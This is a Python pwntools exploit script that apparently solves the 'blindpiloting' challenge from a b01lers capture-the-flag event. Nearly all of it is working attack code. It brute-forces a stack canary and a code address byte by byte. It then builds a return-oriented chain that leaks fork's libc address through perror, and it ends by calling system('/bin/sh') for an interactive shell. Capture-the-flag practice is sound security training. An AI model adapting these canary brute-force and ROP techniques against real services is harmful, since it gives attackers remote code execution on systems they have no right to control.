#!/usr/bin/env python2
from pwn import *
from binascii import hexlify

context.terminal = ["alacritty", "-e", "sh", "-c"]

BINARY = "./blindpiloting.dist"
LIBC_PATH = "/usr/lib/libc.so.6"
HOST, PORT = "pwn.ctf.b01lers.com", 1007

if "--live" not in sys.argv:
    p = process(BINARY)
else:
    LIBC_PATH = "./blindpiloting.libc"
    p = remote(HOST, PORT)

libc = ELF(LIBC_PATH)

# FIRST FLAG
# Brute force the stack canary, one byte at a time.

payload = "AAAAAAAA\x00"
print("0:00")
for x in range(1, 8):
    for i in range(256):
        if i == 10:
            continue
        prev_payload = payload
        payload += chr(i)

        p.sendline(payload)

        # recvuntil will greatly increase brute force speed
        result = p.recvuntil("terminated", timeout=0.8)
        if "terminated" in result:
            payload = prev_payload
        else:
            break

        if i == 255:
            assert "ERROR. Unable to find stuff"

    print(str(x) + ":" + hexlify(payload[-1]))

print("payload: " + hexlify(payload))
print(result)

payload += "BBBBBBBB"
saved_payload = payload

# Overwrite LSB here to get first flag
# p.sendline(payload)
# print(p.recv(timeout=0.5))

# SECOND FLAG
# Brute force actual addresses space by calling perror and expecting 'Success'

payload = saved_payload
print("0:a1")
payload += "\xa1"
for x in range(1, 8):
    for i in range(256):
        if i == 10:
            continue
        prev_payload = payload
        payload += chr(i)

        p.sendline(payload)

        # recvuntil will greatly increase brute force speed
        result = p.recvuntil("> ", timeout=1)

        if "Success" not in result:
            payload = prev_payload
        else:
            payload = payload[:-1] + chr(i - 1)
            break

        if i == 255:
            assert "ERROR. Unable to find address"

    print(str(x) + ":" + hexlify(payload[-1]))

# Relevant addresses
addr_of_perror_call = u64(payload[-8:])
base = addr_of_perror_call - 0xAA1
system_call = p64(base + 0x9F2)
pop_rdi = p64(0xB13 + base)
system_got_plt = p64(base + 0x200FA0)
fork_got_plt = p64(base + 0x200FD0)
read_got_plt = p64(base + 0x200FA8)
perror = p64(addr_of_perror_call)

# Now all the relevant information has been leaked to rop within the binary.

print("address of perror call: " + hex(addr_of_perror_call))
print("base: " + hex(base))

p.recv(timeout=2)

# Ropchain to leak the address of fork
payload = saved_payload
payload += pop_rdi
payload += fork_got_plt
payload += perror
p.sendline(payload)
result = p.recv(timeout=1)
fork = u64(result[:6] + "\x00\x00")

print("fork: " + hex(fork))

# Calculate relevant offsets
binsh = p64(fork - libc.symbols["fork"] + next(libc.search("/bin/sh\x00")))
print("binsh: " + hexlify(binsh))

# Ropchain to execute system('/bin/sh')
payload = saved_payload
payload += pop_rdi
payload += binsh
payload += system_call
p.sendline(payload)

# Note that the solve is slightly inconsistent depending on available bytes, run it again if it does not work.
p.interactive()
